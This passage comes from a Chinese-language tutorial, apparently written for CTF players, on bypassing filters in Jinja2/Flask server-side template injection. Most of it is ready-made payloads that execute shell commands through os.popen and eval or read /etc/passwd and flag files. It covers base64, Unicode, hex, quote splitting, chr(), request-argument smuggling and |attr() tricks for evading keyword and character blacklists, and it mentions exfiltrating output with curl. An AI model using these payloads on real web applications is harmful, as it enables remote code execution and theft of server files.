<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'X19idWlsdGluc19f'</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)][</span><span class="s1">'ZXZhbA=='</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)](</span><span class="s1">'X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">))}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。</p>
<h3 id="toc-14">利用Unicode编码绕过关键字（flask适用）</h3>
<p>unicode编码绕过是一种网上没提出的方法。</p>
<p>我们可以利用unicode编码的方法，绕过关键字过滤，例如：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'</span><span class="se">\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f</span><span class="s1">'</span><span class="p">][</span><span class="s1">'</span><span class="se">\u0065\u0076\u0061\u006c</span><span class="s1">'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'</span><span class="se">\u006f\u0073</span><span class="s1">'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'</span><span class="se">\u006c\u0073\u0020\u002f</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<h3 id="toc-15">利用Hex编码绕过关键字</h3>
<p>和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。</p>
<p>我们可以利用hex编码的方法，绕过关键字过滤，例如：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'</span><span class="se">\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f</span><span class="s1">'</span><span class="p">][</span><span class="s1">'</span><span class="se">\x65\x76\x61\x6c</span><span class="s1">'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'</span><span class="se">\x6f\x73</span><span class="s1">'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'</span><span class="se">\x6c\x73\x20\x2f</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<h3 id="toc-16">利用引号绕过</h3>
<p>我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 <code>fl""ag</code> 或 <code>fl''ag</code> 的形式来绕过：</p>
<div class="highlight"><pre><span></span><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">"/fl""ag"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</pre></div>
<p>再如：</p>
<div class="highlight"><pre><span></span><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'o''s'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__buil''tins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过。</p>
<h3 id="toc-17">利用join()函数绕过</h3>
<p>我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：</p>
<div class="highlight"><pre><span></span><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">"fla"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">"/g"</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</pre></div>
<h2 id="toc-18">绕过其他字符</h2>
<h3 id="toc-19">过滤了中括号[ ]</h3>
<p><strong>利用 <code>__getitem__()</code> 绕过</strong></p>
<p>可以使用 <code>__getitem__()</code> 方法输出序列属性中的某个索引处的元素，如：</p>
<div class="highlight"><pre><span></span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">'eval'</span><span class="p">)</span>
</pre></div>
<p>如下示例：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">'/etc/passwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>       <span class="o">//</span> <span class="err">指定序列属性</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">'__builtins__'</span><span class="p">)</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">'eval'</span><span class="p">)(</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>       <span class="o">//</span> <span class="err">指定字典属性</span>
</pre></div>
<p><strong>利用 pop() 绕过</strong></p>
<p>pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">'/etc/passwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>       <span class="o">//</span> <span class="err">指定序列属性</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'__builtins__'</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'eval'</span><span class="p">)(</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>       <span class="o">//</span> <span class="err">指定字典属性</span>
</pre></div>
<p>注意：最好不要用pop()，因为pop()会删除相应位置的值。</p>
<p><strong>利用字典读取绕过</strong></p>
<p>我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 <code>[]</code> 里来访问，一种就是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问，如下示例</p>
<div class="highlight"><pre><span></span><span class="o">//</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">()</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="o">//</span> <span class="p">[</span><span class="n">__builtins__</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">]()</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<h3 id="toc-20">过滤了引号</h3>
<p><strong>利用chr()绕过</strong></p>
<p>先获取chr()函数，赋值给chr，后面再拼接成一个字符串</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>

<span class="c1"># {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}</span>
</pre></div>
<p>等同于</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">'/etc/passwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><strong>利用request对象绕过</strong></p>
<p>示例：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">path</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">os</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">os</span><span class="o">=</span><span class="n">os</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">ls</span> <span class="o">/</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">'/etc/passwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p>如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。</p>
<h3 id="toc-21">过滤了下划线__</h3>
<p><strong>利用request对象绕过</strong></p>
<div class="highlight"><pre><span></span><span class="p">{{()[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">bases</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">'/flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">bases</span><span class="o">=</span><span class="vm">__bases__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span>

<span class="p">{{()[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">bases</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">bases</span><span class="o">=</span><span class="vm">__bases__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">'/etc/passwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<h3 id="toc-22">过滤了点 .</h3>
<p><strong>利用 <code>|attr()</code> 绕过（适用于flask）</strong></p>
<p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
<div class="highlight"><pre><span></span><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span>   <span class="o">=&gt;</span>  <span class="p">()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__class__"</span><span class="p">)</span>
</pre></div>
<p>示例：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__class__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__base__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__subclasses__"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__init__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__globals__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"popen"</span><span class="p">)(</span><span class="s2">"ls /"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"read"</span><span class="p">)()}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><strong>利用中括号[ ]绕过</strong></p>
<p>如下示例：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="s1">''</span><span class="p">[</span><span class="s1">'__class__'</span><span class="p">][</span><span class="s1">'__bases__'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subclasses__'</span><span class="p">]()[</span><span class="mi">59</span><span class="p">][</span><span class="s1">'__init__'</span><span class="p">][</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls").read()'</span><span class="p">)}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="p">[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="p">[</span><span class="s1">'__globals__'</span><span class="p">][</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p><strong>这样的话，那么 <code>__class__</code>、<code>__bases__</code> 等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。</strong></p>
<h3 id="toc-23">过滤了大括号 <code>{{</code></h3>
<p>我们可以用Jinja2的 <code>{%...%}</code> 语句装载一个循环控制语句来绕过：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">'catch_warnings'</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">"__import__('os').popen('ls /').read()"</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p>也可以使用 <code>{% if ... %}1{% endif %}</code> 配合 <code>os.popen</code> 和 <code>curl</code> 将执行结果外带（不外带的话无回显）出来：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="o">.</span><span class="n">linecache</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span> <span class="o">%</span><span class="p">}</span><span class="mi">1</span><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p>也可以用 <code>{%print(......)%}</code> 的形式来代替 <code>{{</code> ，如下：</p>
